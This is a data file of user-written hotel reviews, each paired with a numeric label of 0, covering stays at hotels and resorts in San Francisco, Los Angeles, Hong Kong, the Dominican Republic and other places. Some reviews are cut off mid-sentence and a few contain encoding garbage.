"great service, good location, big rooms my wife and i stayed at the stanford court from june 10th to 12th and were very pleased. we didnt go the priceline route like the last feller, but still found the aaa rate to be reasonable. we were given a 2nd floor room facing an alley, but after a night of noise we asked to switch. they were very accomodating and polite about it, and moved us to a nice quiet upper floor courtyard room while we were out touristicising. it is a full service hotel; doormen, bellhops, turndown service, excellent concierges... everything was handled with utmost professionalism. the hotel is not a modern marvel, but i wouldnt call it 'antiquated' like some other reviews on this site. our rooms were large and well appointed, large bathrooms and down pillows. the location is very good right in nob hill uphill from union square, and there are 2 cable car lines that run right to the corner of the hotel. a nice close-by lunch is at the italian cafe in union square (great people watching) and it really did feel like being in rome.i would definitely recommend the stanford, you get treated like royalty without shelling out the royal jewels.",0
ok for sheraton stayed the night of 07/24 in room 1163. this hotel was your typical full service property. standard sheraton hospitality but for all that was touted on its website i felt under served. the rooms are not well insulated so you do here noise throughout the night as guests arrive and depart as is expected of an airport location. but one would think that this would have been better considered for this location.,0

"renaissance really does = ""excellance"" just piggy-backing on the review that convinced us to stay here (renaissance = excellance). :)i never think too highly of airport hotels for some reason, but this one was killer (in a good way).awesome experiences in chronological order:1. registration/check-in quick easy.2. lobby is elegant comfortable.3. room is simple, but nice.4. flatscreen tv is winner.5. room service delivery was professional nice.6. food from room service was surprisingly delicious - specifically the steak fajitas, steak sandwich, veggie sandwich, portabella basil chicken flatbread.7. breakfast buffet was tasty had a good variety of food. (chocolate pancakes anyone?)8. check-out room close-out straightforward fast.in conclusion, stay here.",0

"outstanding for our first trip to hong kong, we chose the peninsula based on its reputation and historical role over the last 80 years. it was superb.as mentioned by many, it was service that was key. met at the curb by a front desk rep, we were quickly transferred to our rooms. throughout our 4 day stay, we used room service for breakfast (included in our rate), enjoyed the afternoon tea (also included) and shopped at the hotel's arcade. custom made suit at mode elegante -- a worthwhile splurge.new to the hotel is a superb spa. two floors of asian luxury with the best treatment rooms and waiting area (steam, sauna with view of the harbor, special shower with 3 climate settings, and a quiet room with indidual chair/beds with earphones). i have seen. even better than mandarin oriental london or miami. total top of the line.only two nits: no great bar. only bar was a smoky 2nd floor space with no view -- cigars for american and japanese businesmen. also, restuarant felix on top floor was quite poor.",0

"amazing experience! my girlfriend and i just got back from 7 nights at gran bahia principe bavaro and we had a wonderful time.the thing that stood out the most for us was the absolute cleanliness of the place. there was no garbage, no dirt, no tree debris after a stormy night. the grounds and the landscape was kept immaculate. even the beach was combed daily and all the garbage was removed. we could literally walk along the beach and know when we had come back to the bavaro property b/c the garbage abruptly stopped.the breakfast and dinner buffets were excellent. i haven't been to too many carribean resorts, but they were comparable to any canadian breakfast or dinner buffet that i have gone to. lunch on the other hand was rather mediocre. however, what they lack in variety during lunch they make up for in convenience by having two lunch buffets right at the pools by the beach that are open from 12 to 4. i stuck with the hamburgers, hot dogs, and fries - i found it generally satisfying until the dinner.during the week, we were given three a la carte dinners. we went to the mexican restaurant, the steak house, and the japanese restaurant. unlike some reviewers, i loved the option of having a buffet along with what you could order on the menu. that way i was able to try lots of different things and still have higher quality food and the personal attention of a waiter. the food at all three was great. they put a lot of care into the food.on the other hand, we were given a fourth free a la carte on christmas eve, and that was torture. it was an 8 course meal, that provided zero choice and lots of shellfish which i'm allergic to. it was really frustrating to sit through that without being accomo",0

"great hotel in a great location for fisherman's wharf this is a very stylish hotel, a couple of hundred yards from the wharf. we stayed for two nights and had requested a high floor on the front, which is exactly what we got - not that the view was very good but we did have a view of the water (but only just!).the room was well presented with modern fixtures and fittings in good working order. staff were friendly and helpful and we enjoyed the complimentary wine tasting (1 hour) each evening. coffee and biscuits were also priovided for 3 hours each morning.only two negatives worth mentioning:-1. the shower pressure was so low that it was a challenge to get wet all over!!2. valet parking is provided at $36/day which was, i thought, excessive. you could, for example, park across the street for only $10/day nb but this was only open until early evening, after which you would need to park on the street (which is free overnight).we ate both nights at fisherman's wharf - the first night at alioti's and then at nick's lighthouse. both were really good - alioti's was more grand than nick's with a view and prices to match but we thought we got value-for-money at each.i thought that, all in all, the tuscan was an excellent hotel and i would happily recommend it to anyone visiting the area.",0

"nickel and dime the hotel itself was nice. the room was ok. upon entering you got the slight smell of mustiness, the carpet had small snags in it, and there were no rca connections on the tv to hook up a dvd player. there were 2 bottles of water on the table with a $5 price tag on each which would be billed to your room if you drank them which i thought was a joke! the shower was missing some caulking around the tub and i think they stopped making that pink shower tile back in the 80é¥???. the electronic keys i had for the room only worked after trying each of them numerous times. paying $9.95 for internet service per day was ridiculous when you can get it free at all starbucks and best westerns. and the daily self parking fee of $24 dollars was a joke, even though it is quoted at $22 in the black guest book in the room. and to top everything off upon checking out i assumed the price i was quoted and booked online included all fees, but i was informed it did not include the daily $13 hotel tax which i had to pay. it seems that this hotel is more worried about getting you in the door at a reasonable room rate so they can nickel and dime you into getting a second job not unlike home depot. in my opinion if they took as much time paying attention to there guests as they do charging you for any and everything, this hotel would be a nicer place to stay. not a sermon just a thought.",0

"perfect location, excellent staff after reading previous reviews, i must admit i was extremely worried. i was travelling on my own and as a young woman, obviously i needed to research area and hotel properly. on my arrival after a long flight from london, staff were excellent. friendly and very helpful. i had pre booked a tour for following day, which they called and confirmed for me. they also advised best company for my trip to magic mountain, which was organised for me with no fuss. they asssited with mail to be sent, safety deposit boxes and always said hi when i passed through reception.rooms were clean, and a fair size, coming from england, i think the beds are huge! and i can verify there was no signs of bugs or any other scary things!! they were cleaned daily and housekeeping staff were as friendly as their colleagues on reception.the corridors of hotel could do with updating - there is nothing that a coat of paint and new accessories wouldnt fix. the restaurant was good too - once again staff couldnt have been nicer - the breakfast was lovely. there is a bit of a food smell where the elevators are next to restaurant, but not too bad that its puts you off!!finally, i just want to say that this is the first review i have ever written but i was determined to let people know that previous reviews are no longer valid for this hotel. combined with great location, walking distance to hollywood blvd and all attractions, this was a great place to stay!!",0

"location plus elbow room ! to find that the reviews i had read on tripadvisor were not exaggerations was refreshing. on june 6th, when we (4 adults, 3 children - ages 3, 5 12) arrived at 49th 3rd, we all were more than pleasantly surprised, with the location and the apartments. my grandson 's immediate reaction was: this is great!. i was relieved. the hospitality house truly was a find i never would have trusted without tripadvisor's recommendation. both units were clean and spacious, the a/c made the heat and humidity bearable and the well-stocked refrigerator made late-night snacks and breakfast convenient and economical. it really was as advertised: an excellent value, perfect for families with children and just like actually living in nyc. the staff was courteous and helpful and even helped with getting discounted tickets. we look forward to staying there for our next visit to nyc - with or without children.the only negatives are the elevators (slow small) and the hallways from which you enter the units: dark and worn. but once the door was opened, all doubts disappeared. thank you very much. we enjoyed it so much, we were sorry to leave.",0

"don't make my mistake! i have read the reviews of this property albeit too late. i have just returned from a stay at the royal inn. unfortunately, i must agree with the majority of trip advisor users. this was the worst hotel experience of my life. that includes an overnight emergency stay at the travellodge in downtown chicago, where some of the rooms must have rented by the hour. this property is filthy. the staff is uncaring and/or inept. i'm not sure if they even have an on-site cleaning staff. i certainly never saw any while i was there, and my room was never cleaned. the shower was dreadful. the trickle of water was unbelievable. i kept waiting for the pressure to build, but it never did. i'm suspicious that the review about the upgrade to a master suite is a planted posting. unless they didn't post for a long time after their trip, i was just there (late-nov) and saw no evidence of any improvements being made. many are needed !",0
"great place to stay! i have stayed here two times with my family and we couldn't have been more satisfied with the place. i'll admit that it is outdated, for the most part, although some rooms were renovated a couple of years ago but the rooms remain very clean and spacious. the hotel has two restaurants, one casual and the other white tablecloth, and both offer excellent food at reasonable prices. the olympic-size pool is wonderful for serious swimmers and frolickers alike, and a cute tiki bar offers every favorite libation. the grounds around the hotel could use some sprucing up, though. some staff members seemed a little indifferent to the needs of guests but most were nice enough.the neighborhood is safe and walkable with many restaurants and shops located up and down ventura blvd., including a ralph's grocery store just across the street that is open 24 hours. the location, itself, is very convenient to any other area attractions that beckon tourists.i highly recommend staying here if you don't mind a laid-back, unpretentious atmosphere. the rates are reasonable and the parking is free, which normally isn't the case in the la area. i would definitely stay here again and again.",0
"unpleasant encounter first of all you need to be aware that this hotel is not in frankfurt, but in neu-isenburg / gravenbruch which is quite a distance both to the city as well as the airport. tripadvisor lists this hotel under both frankfurt and neu-isenburg where in fact these listings should be merged.i have booked a day room in this hotel as part of the free arrival service for lufthansa first class passengers. the problems already started with my reservation. i had emailed them requesting a room and my email remained unanswered for over one week. after sending a reminder, i received a confirmation. when i had to postpone my arrival by one day, i sent them a note with this request. their confirmation (in a very impersonal template-email) then showed an overnight stay which i had never requested. i asked them to rectify and eventually got the correct confirmation. however, two days before my arrival they seemed to be so confused that they emailed me and even called my parents (whose contact number i had provided since i was travelling overseas) to check again on my arrival",0

"red light hotel we stayed twice within 2 weeks at this hotel and had 2 complete different experience. we book thru hotwire and paid $99 taxes in. the rooms were clean and the location is great for people coming in and out of the airport. there is also a trolley that can take you to manhanttan beach or some shopping malls for $3 round trip. pretty decent. our first experience was decent, professional staff, clean rooms.. however, our second experience.. what a nightmare. they had a covention of rough riders bikers. they almost fill the entire hotel. people were yelling and partying all night.. apparently, we were the only one on our floor not invited to the party. people knocked on our door all night (litterally we had to get up at 4:30 am to catch our flight and there were 4 people sitting in the hallway envoying another drink next to our room door.) we should have thought it would turned out this way when we saw police cars parked in front of the hotel when we checked in.. when we checked out, there was only 1 employee in the lobby and clearly he looked at uncomfortable as us... we saw prostitute in the lobby (it was not hidden - remember - we were intrudes into their convention), people driking from their vodka bottles... really, we could not get our of there fast enough... beware... if that is the kind of group they want to rent their hotel too... they should let other customers know uo front what is to be expected for the week... the poor clerk at the lobby wanted to leave with us.. nothing in this hotel was under control.",0

"loved the gran bahia! we stayed at the gran bahia principe from august 19 to august 26 in celebration of our 25th wedding anniversary. we booked the gran bahia based on reviews from friends and acquaintances. the resort greatly exceeded our expectations. the minute we arrived we were greeted by girls wearing traditional costumes, men playing the merengue and waiters bearing glasses of delicious fruit juice. what a way to start a vacation! greetings of hola resonated throughout the spacious lobby putting all the travelers into an instant holiday mood which lasted the entire week. we upgraded to the golden club which allowed us to be checked in while we were enroute from the airport, so we were taken to our room immediately upon arrival. the rooms are gorgeous. they are neat and meticulously cleaned every day. the bathroom is spacious and very clean. we were nervous that there might be some insects in the rooms due to the country's location, but that was certainly not the case. our mini-fridge was well stocked and became even more so after a tip to the maid of only $2. we usually left her $2 - $5 a day. we were very unsure as to the appropriate amount of money to tip, so we asked our tour guide and she assured us that we were being quite generous. canadians are used to tipping 15% - 20%, so we thought $5 at the a la cartes was a little cheap, but she said it was quite the contrary. the wait staff at the restaurants were so very eager to please and accommo",0

"impersonal but grows on you a functional hotel for the business community, it can easily make the tourist who is not dressed for the office or in a noisy group feel they are not in the right place. it seemed that any small talk by the reception staff would be a dismissible offence and even after five days there was no sign of our being recognised. this approach however may be preferred by others, the hotel being sited between the mgm tower and fox studios. a report of a dud bulb in the bathroom was dealt with promptly and when we brought a bottle of wine into the room, glasses appeared without request.once we persuaded the concierge that we really did not want to hire a car and pay the exorbitant hotel parking fees he was very helpful in showing us how to walk to rodeo drive (10-15minutes away) where you can get a 45 minute tour of the stars homes on a tram for a fraction of the cost of the coach tours that collect you from the hotel. outside the hotel are regular buses to santa monica (cost 75cents), the farmers market ($1.25), and hollywood ($1.25). the bus guide tells you to catch two buses to hollywood but if you are willing to take a ten minute walk at the hollywood end you save time and money.the garden; outside swimming pool and jacuzzi are all one would expect of a good hotel but they need to sort out their catering facilities with e.g. the coffee shop run by starbucks closing at 3.00pm. it feels like the management is dominated by accountants, but for all its faults, what the hotel did provide, was provided very well. by mixing what the hotel did well with the food hall and supermarket at century plaza shopping centre on the other side of the road our satisfaction with the hotel grew through our stay.st8sman essex",0

"great location and room/horrible service i stayed in his hotel for 3 days. the room was nice but extremely small. they named it a junior suite, but it was a standard room (hence, don't pay for the suite - it's not worth the extra money). the service was extremely poor from the time i made the reservation until the time i checked out. after speaking with the hotel manager i quickly understood why the rest of the staff was rude. i guess it's a trickle down effect. i will never stay there again because of the service, but if bad attitudes don't bother you and you want a good location in the quarter, it's worth a try.",0

"nice place my husband, two kids and i stayed at the tuscan inn for 3 nights in late august. although we had reserved a suite with sitting room, it was too small for the four of us. we ended up with two interior connecting rooms, though the price was more than advertised on the website. yes, the courtyard rooms are dark, but we weren't there much during the day anyway. though small, the rooms were clean and nicely decorated. the staff was friendly and polite, and the a.m. coffee greatly appreciated. try the restaurant , as they have decent meals and offer 10% off to hotel guests. we'd stay at the hotel again since the location, facilities and price were good.",0

"i don't think it's scary or creepy! i stayed here for a three-day weekend in september 2004. i got the room on priceline for $60 and was a little worried while i was reading these reviews, thinking it would be desolate and creepy. but i didn't think it was at all! i checked in around 1 am, and there were people around. i did not feel uneasy. in fact, there were people around all weekend. there were weddings and other functions each day, and lots of tourists. the room itself was not nearly as beautiful as the common areas, but it was fine. it was clean enough, but did seem old. more like a 2 1/2 to 3 star room. the lobbies were gorgeous. every staff member i encountered was professional and courteous. as for the homeless people, of course they are around. this is a major city. use common sense and don't go into dangerous areas. downtown is not the best place to stay, but they are building it up and there are some nice places to go, such as moca, little tokyo, and some art galleries if you are adventurous. also, you are 20 minutes to everywhere, santa monica, hollywood, pasadena. it was a really good deal, especially through priceline.",0

"very pretty hotel with nice service but average room i just returned from a weekend trip for business at the royal palms. i was put in regular room next to the road. the room had low ceilings, a small bathroom and no water pressure. the room was very dark because the main window looked out to the walkway to the other rooms so if you opened your blinds anybody in the hallway could look right in your room. truely an awful setup. i also requested a king bed but was given two doubles instead. the beds were extremely comfortable but i don't like to travel and stay in a bed smaller than mine at home. i was told they would move me the next day but never contacted me so i didn't bother to switch. the tv was an old zenith 25 inch with a dull picture. also the towels were very small for a five star hotel. the pool was small and the lounge chairs all occupied. you had to wait for the pool guy to find you a chair once somebody left. it was a very quite and adult type area and not very good for children. on the positive side, the staff was very friendly and went out of their way to be helpful and caring. the food at all the functions was great and the grounds are wonderful. the lobby is warm and inviting. overall a lovely resort but the room was just so dark and depressing i'm not sure i would want to stay there again unless i could get a room in another location. i've stayed at most of the other upscale places in scottsdale and the darkness of the room was a real turnoff. i also missed not having a golf course on the grounds. i would not bring my kids to this resort as it would be a real dissapointment for them compared to the phoenician, biltmore, hyatt, or princess.",0
"great airport hotel we stayed at the renaissance in june when my husband was attending a conference there. i was very pleasantly surprised by the quality of the hotel! it definitely was above the standard marriott hotel in terms of the bedding and its comfort; the bathroom linens were a little more plush, also.the hotel was very quiet. even though it is in the approach route for several runways, there was no airplane noise at any time.my only complaint? there is no direct subway or bus into downtown la from the hotel. i went back to the airport to get a shuttle into la.",0

"great place to go with the family! we stayed at this hotel for 6 days and did not want to leave. we had a very relaxing time and enjoyed the lazy river, water slide and the dive in movie on saturday night. our son is 4 and is just learning to swim. we took off his life vest and he was able to slide down the slide by himself. one of us was waiting to catch him in the 3 foot deep water below. the slide is perfect for smaller children and adults that can't handle huge slides (like my husband!). the drinks by the pool were a little expensive but snacks and beverages were located right by the pool. the restrooms were very clean -even at the end of the day. we ate most days at the hole in the wall and never had a bad meal. the chili, ribs, salads and chicken were all very good and the portions were huge. the only bad meal we had was breakfast at the lantanta grill. the service was terrible. i swear they had one waitress for the whole restruant. we got one cup of coffee and never saw the waitress again. we had to go search for the check and the people sitting next to us finally got their own water because nobody elso was around to do it. we loved our room. it was perfect for us. our son who wakes up very early was able to go into the other room and watch t.v. while the rest of us slept in the bedroom. we would recommend this hotel to everyone. the only other complaint i have was about the railing outside of our room. there was a huge space on either side of the railing. it didn't look to be damaged-it just had huge gaps. the first thing my son did was to inform us that he could stick his head through the hole. my husband pulled him back in time. i did say something to a security personal -but of coure he told me that a child couldn't fit though the railing. i told him my whole body could fit through the hole when i turned sidways and i weigh 140lbs. i am mentioning this problem because though i loved this hotel, i don't want any child to fall. we really did like this hotel but when you stay there i am sure you will see the gaps in the railing for yourself and if you have small children will understand my being very nervous about this. if more people complain-i hope they will fix it. we are looking forward to staying here again. we also found the hotel personal to be very friendly and helpful. they were so nice in the giftshop. we bought some presents for friends and for our daughter because it was her 1st birthday. we later returned to our room to find a present for her from the staff in the giftshop. it was so unexpected and our daughter loved the bear and so did we!",0

"wonderful experience we just returned from our stay at caribe club last night! we took another couple who have been at 4 other resorts in dr last 4 years. loved the room right by the pool and just steps from the beach! loved mamma mia, the italian restaurant, and the asian restaurant! both great! loved the concierge who can book your dinners every morning at your building. excellent employees who always smile. won some money at the casino too. i did get many mosquito bites though, they were fogging the grounds at night. didn't get any last year. the in-room safes are broken and need repair. the patio doors on ground floor need some lock repair. however, the rooms are very clean, a little",0

"perfect airport hotel my husband and i stayed at this hotel for 1 night in september after a long haul flight. we wanted somewhere comfortable, that was near the airport so we could pick up the hire car easily the next morning. the holiday inn fitted the bill perfectly, the price is very reasonable considering the size of the rooms and the hotel staff are happy to arrange free shuttle transfers to and from the airport or car hire depot. our room was a king suite, was very clean and had a huge, extremely comfortable bed. we weren't very hungry so the waffle house next door to the hotel was sufficient for us, apparently there is a restaurant in the hotel next door for more substantial meals. the complimentary breakfast is very nice and has a wide selection of breads, pastries and cereals, as well as eggs and bacon. check-in was fast and efficient and the staff were helpful and friendly. there is a pc in the foyer which guests can use to access the internet. if you're looking for a hotel near the airport before or after a flight then i highly recommend the holiday inn.",0

"Nothing To Brag About... We stayed at the Majestic from August 18th - August 26th and could not wait to return home. There is no doubt that the resort is beautiful in appearance, and after staying in Punta Cana last summer this resort had a lot to live up to in order to compete w/the Paradisus Palma Real. There is no doubt in my mind that Paradisus blows this place out of the water.I am just going to state the facts:1. There were too many uncontrollable children on the resort w/nothing to do. They were jumping from the overhead bridges into the pool, cartwheeling into the pool, and even leaping into the pool from the ledge of the whirlpool. The resort honestly needs to invest in a children's program and/or activities for children. I did notice that there is a castle being built, which looks like it is in the works for the children. Maybe that will improve this issue.2. On 2 separate ",0

"would not stay here again we stayed here from july 25th - july 29th 2008. it was the end of our honeymoon after going to vegas and hawaii.arrived late on a friday night, valet staff very kind and helpful. checked in at reception, brief description given to us of where we had to go and where everything wasetc..i think we were in room 503. overlooking the back of the hotel roosevelt sign - neither of us were too worried about the view s didn't mind. our room was vey modern and decorated nice however the rooms are very very small!! bathrooms are tiny!!!!!! we found the bed too small and uncomfortable, very loud airconditioning fan that you can not turn off, i am not a light sleeper but it kept me awake - on the second night at around 3am i asked at the check in desk if they could get someone to come and turn it off. very surprised that by the time i had returned to the room this had been done and an engineer had come to turn it off. however on return to the room the next day it had been turned back on again!!! rooms werent overly clean and hotel in general very dark dingy and noisy. we didnt get to the pool or the restaurants.valet staff helpfull pleasant and overall appeared to be nice people. shame about the rest of the staff.also be aware that when you check in they charge your credit card $150 for every night you will be there as incidentals then refund it on check out. we were not informed of this on check in and had tried to use our card whilst we were out and had it declined - took about 3 dys after checkout to have the money returned to our card.",0

great downtown location attended a business meeting in downtown phoenix and stayed at hyatt. great location; easy walking distance to many attractions in downtown phoenix. short shuttle ride from phoenix sky harbor airport. had a room on the 21st floor with great view of the city. beds were heavenly and covered with light down comforter. the only negative is you have to pay $12.95 for a day for internet access. would have thought this would be complimentary.,0
"great hotel, loved this place even though this was an airport hotel i really liked it a lot. the room i had (213) was very comfortable, had a pool view and was large and spacious with a balcony. there were two queen beds and they were so comfortable i hated getting up in the morning. high speed internet was good and reliable. the reataurant was very good with a surprising array of tasty choices( i highly recommend their fish chips) . the restaurant staff and front desk staff were really friendly and suggested great places in the city to visit and eat. after work i relaxed in and by the pool every evening and it was great because there were very few people out there most evenings so it felt almost private. the only negative was because of it's airport location the planes do come right over the property when landing and you can ignore it after a while but in the beginning it was noticeable. parking was plentiful and free. overall i liked the whole package apart from the aircraft noise when outdoors by the pool but i would highly recommend it to anyone looking for good, clean, high quality accomodation near the airport.",0

"excellent hotel in great location having read numerous good reviews about this hotel i decided to book for 9 days. we have absolutely no regrets and would stay there again. as we did have plenty time, we were able to sit a couple of hours on three suny afternoons at the pool terrace. the views are wonderful.we could not fault the staff, who went out of their way to ensure we had all we needed, and offered advice on travelling around.as we arrived at 9am, we were delighted to be told a room was being prepared and we were in by 10.15 after an amble round victoria park.we booked a harbour view room, and as seen in others' review this is often a slightly sidewards view, as directly in front is a school and many sports courts. this did not detarct from the views as it was interesting, for instance, to see all the school pupils in straight lines at 9.45am prompt, folk doing their early morning t'al chi and activity in the victoria park as well as cruise liners and the star ferries etc and over to tst.the tin hau mtr is less than 5 minutes away, [for speed] as are trams[who needs to rush on holiday, anyway] and buses. often in the evenings we walked into causeway bay proper after dinner -less than 10 minutes brisk walk, either via the main road or the park. the library, en route, is the most beautiful we have seen and has great views from upper floors. it's worth a look.it took about 8 minutes to get to admiralty to change for tst, over the bay, although on several occasions we walked though the park the on to the prom at the front right along to wan chai/ the convention centre.some nights, for speed, we ate in the cafe de coral, opposite the tin hau mtr, where the food is pictured- we could not figure out the chinese language, and which was amazingly cheap- hk$79 / less than ?¢7 for 2 meals of sirloin steak, with coffee! staff there, too were very helpful and ensured we did not 'miss our number' on the board if they forgot to put it up.we did have breakfast in the hotel a few mornings, and on some we bought juice from the wellcome supermarket next door and delicious pastries from the bakers a few shops further on.as other posters have said, the hotel breakfast, though bountiful with cereals fruit and choices of eggs meats etc as well as dim sum, it is the same daily so can be boring as well as working out expensive by comparison if for a large family.while the rooms are not huge, they are perfectly adequate and very clean, as are all areas of the hotel. kowloon, while wonderfully atmospheric by day or night was almost claustrophobic for us so the causeway bay area around the park and metropark was a welcome oasis.it is also important to say that at no time during the duration of the holiday did we feel at all intimi",0
"would not recommend... my family and i stayed at celebrity resorts-waikiki for 6 nights in may 2008. to start:the check-in went pretty good.the location -i don't think- is good at all. it is a block from a strip-club and at night street walkers and dive bars are right around the corner. the resort staff was a bit over whelming for my family, but they were nice. i don't think that you should have to pay $10/day for parking, seems a bit much. also they charge a $3.99/day fee for coffee in the am and the safe, both of which we did not use. the room. really out",0

"two thumbs up my wife and i just returned from our second visit to the pointe squaw peak this summer. our first was virtually flawless - marred only by a drunk banging on the door of an adjacent casita. the gm took this incident to heart and comped one night of our most recent stay. this stay was even better. some of the front desk staff could use some instruction on people-handling, but this did not detract in any way from the over all experience. we are hilton diamond vip members, and service at this pointe (as well as the tapatio cliffs) is as attentive if not more so than the waldorf astoria or the palmer house or the conrad london. highly recommended.",0

"fantastic price, fantastic location, but they need new beds! my partner and i stayed here for 8 nights. i read a lot of reviews before we booked so was prepared for the small rooms, communal toilets etc. in fact it was a pleasant surprise when we arrived as our room was bigger than expected. staff were really cool and helpful and the room was always spotlessly clean when we returned to the hotel each day. and of course you can't beat the location.just a couple of minor things that could easily be improved, our bed was possibly the worst i have ever slept in. it dipped in the middle and as the frame was on castors the whole bed would move if you/or your partner moved around in the night. it was only for the fact that we were absloutely exhausted from sightseeing that we got some sleep! also they loan hairdryers and irons which is great. but it would be even better if the irons worked!but i really liked this place so despite these minor points i would still recommend it!",0

food poisoning just read a review about this hotel. me and my husband went for two weeks in november and all ive really got to say is its the worst holiday ive ever had butlins in the carribean but the foods worst. ( i have written proof from enviremental health that i had food poisoning and it wasnt the mildest dose by any means) but ilness is a common thing there. and just before any one says its a third world country weve been to the dominican republic before stayed in a 3* hotel called the victoria hotel in purta plata and it was fantastic so before anyone books this hotel you have been warned. as for the review,0

"it was alright... i had a friend from out of town that stayed at this hotel before flying out of lax. i came down for the night to visit and stayed with her. the room was clean, and that was probably the best part of the stay. the bed was quite hard, and neither of us got much sleep. the sleep we got was also disturbed by planes taking off and landing, which, i admit; is something you have to deal with staying by the airport. we also ate at shula 347, which was the restaurant in the hotel. the prices were reasonable, and the food was quite good. the service could have been a little more attentive; but overall it was a fine experience.overall, it was an okay experience; nothing to rave about, but nothing super exciting either.",0

great location but noisy we stayed at this hotel while in seattle on business. check in was very complicated they had no parking available when we arrived and the front desk staff was not helpful at all with the parking situation. our company was paying for the stay but when we arrived we had to wait 45 minutes for someone in the office to figure out what was going on. when we arrived in our room we were plesantly surprised it was large very clean and comfortable. the wireless internet left a lot to be desired very slow and constant drop offs. in the evening the noise from the freeway nearby was constant.. for the money that this establishment cost we could have stayed in a sheraton or hilton and been a lot happier,0
"location location location stayed at the best western tuscan inn on august 6-8, 2004. if you are visiting san francisco for the first time or love fisherman's wharf, this hotel might be the place to stay. very central to pier 39, ghiradelli square....walkable...but need to ride a cable car or drive to golden gate bridge, golden gate park, union square or chinatown. hotel overall is very clean...room is small...but nice and clean...bathroom a little on the older side....not the greatest....service was okay....lots of restaurants and shops nearby....cafe pescotta next to hotel....food was good....so check it out....not the best of hotels...but not the worst either...above average.....if you want convenience stay here....if you want luxury go somewhere else",0

"good location for pre-cruise - but eat at bayside this is an older holiday inn in the port of miami. the location is great - a five minute taxi to the cruise ships and across the road from bayside which has lots of shops and bars with lively music and a nice atmosphere. one morning we sat at a cafe watching the pelicans and the dolphins swimming in the harbour.we had a room with a fabulous view across the bay. the room was clean with comfortable beds. slightly damp from the miami humidity - no heating so you need to switch off the air con to secure any warmth at all on chilly winter nights staff are great and very helpful, especially jairo the bell captain who goes out of his way to assist - and will book exactly the tours you want.the evening meal we had was not very good but bayside across the road has loads of choice for food.would recommend this as a short stay for cruises - great location.",0

"a bit disappointed stayed here for 2 nights on our return from a trip to oz. arrived very tired around 2 a.m. as our flight was delayed and was greeted by a very unfriendly receptionist (not the usual friendly singaporean welcome!). she said they only had one room left, even though we had paid for and reserved a room weeks ago. we were told that we could be moved the next day if we wished but as we were only going to be staying for two nights we felt sure the room they had to offer us would be sufficient. how wrong we were!!! we were given a tiny room on the 6th floor right next door to a conference room and a break out area for smoking and drinking tea and coffee. the two single beds we were given were very uncomfortable and seemed to be a pull out type bed for children é¥?not the kingsize bed we were expecting. the carpets were stained and the bathroom and room overall was in desperate need of refurbishment. by the next morning and a miserable nighté¥??? sleep (even though we were exhausted) we decided that the room was not acceptable even for just another nighté¥??? stay. reception this time was slightly more helpful and offered us a room change to a higher floor later in the day. what a difference 7 floors make! the room was spacious with a good view and a comfortable kingsize bed é¥?this was all we had been expecting from a hotel of this standard. the hotel itself seems a little",0

"nice my wife and i stayed at the chelsea lodge for 5 nights. we stayed in the basement suite ($150/night) that had it's own bathroom. the room itself was perfectly fine, plenty of room, bathroom was nice - we enjoyed it thoroughly.a couple of issues:1. the bed - this was the biggest issue for me although not a vacation killer. the bed is a double (not a queen), which is fine, but it sags... fairly badly. so in other words, you and your significant other roll into the middle (which is fantastic, unless your trying to sleep ;) ). solution: put a pillow in the middle - it gives support and prevents you from rolling into the middle.2. noise - i'm not extremely sensitive to noise, but a couple of nights there were young groups of people walking down the sidewalk who weren't extremely noisy, but i could hear them fairly easily because there is very little sound-proofing from the window airconditioner being in the window. solution: crank up the fan on the air-conditioner for white noise or wear ear plugs.there is a grocery store, a lot of restaurants, a few atms, and two subway stations right near by - fantastic location.i mentioned the two issues i came across in staying here, but they wouldn't deter me from coming back.",0

"Great Vacation - Excellent Food, Location  My wife and I have traveled extensively, we are used to dining in quality restaurants both at home and when we travel, and while we usually prefer to stay in normal hotels and eat in restaurants outside the hotel, we have stayed at several all-inclusives in the Playa del Carmen area of Mexico ranging from mid-range to high-end. This was our first trip (March 25-April 1)to an all-inclusive in the Dominican Republic.There have been a lot of reviews posted about the Majestic Colonial, and savvy readers of TripAdvisor reviews should be able to glean something approximating the truth from them. Our experience at the Majestic was pretty much what we expected after reading these reviews. We are really picky, and we loved our stay at this hotel.People who dislike this hotel likely fall into one of two categories: 1)those who may have had some type of unusual problem while there and 2) those who simply cannot be happy. The food at this hotel is excellent - by far the best we have had at an all-inclusive. Piles of smoked salmon every morning at breakfast, locally grown vegetables and fruits that taste 10 times better than the trucked-in ones we can get at home (especially in the winter), and uniformly good seafood, duck, chicken, lamb, goat, and pork (I can't speak to the beef, as I didn't try any) were available at the Majestic. Perhaps those who are unhappy with the food did not try the many inventive preparations available -- highlights for us were the grilled shrimp filet that my wife had in the French restaurant and the Peking Duck that I had in the Asian restaurant (for which you do not need reservations unless you want to see the Japanese show). The local Dominican specialties in the Dominican restaurant (and in the buffet) are also a highlight. Try eating some foods that are outside your normal routine and you will be happy at the Majestic. Best of all, unlike any other all-inclusive we've ever been to, we never had to wait for anything (well, there was a short line for the omelette station at breakfast, but there were 8 types of egg dishes including pre-made omelettes available without waiting). I don't know where the people who complain about this place being crowded are coming from. On our one rainy day during the week, when pretty much everyone at the hotel was at breakfast at the same time, there were empty tables in the buffet restaurant. At night, we never ate in a restaurant that was more than half-full. The tables are so far from one another (compared to tables in a normal restaurant) that we were never bothered by even noisy conversation at the next table. Even at the buffet, staff circulate pouring wine at every meal - there's champaigne at breakfast. Service at the hotel is top-notch. Everyone is super-friendly and helpful. My wife and I both felt the staff was a major plus at this resort. True, not everyone speaks perfect English (or German or Italian or French - as there are many European guests here), but the frontline staff do pretty well with it. Try a little Spanish just for fun.The beach is great. The pool is great. The rooms are beautiful. The jacuzzi tub in the room is deep and comforable for two. The lobby with bars and live music is great. Great news about the bars, too. Apparently the management of the hotel reads these posts. Gordon's gin and Smirnoff vodka are now available at all bars as part of the all-inclusive. The local rum is actually very good, especially the dark one. I also had a nice Spanish brandy every night, again all-inclusive. The drawbacks that keep us from giving this five stars have been mentioned several times in other postings. The mattresses are super-hard. I like firm, but these are killers. The hotel should put some foam padding on them, at the least. The bathrooms give no privacy - I spent some waiting time on the porch due to this, which was actually pleasant. Finally, and I think this is an easily fixable problem, the availability of decent food between the hours of 3:30 and 6:30 p.m. needs to be addressed. We arrived at the hotel very hungry and the only food available was at the beach restaurant. There were hotdogs and hamburgers (which my wife and I do not eat) and a few finger sandwiches with flies all over them (the wind was still that day). I strongly suggest that one of the indoor restaurants stay open all afternoon to accomo",0

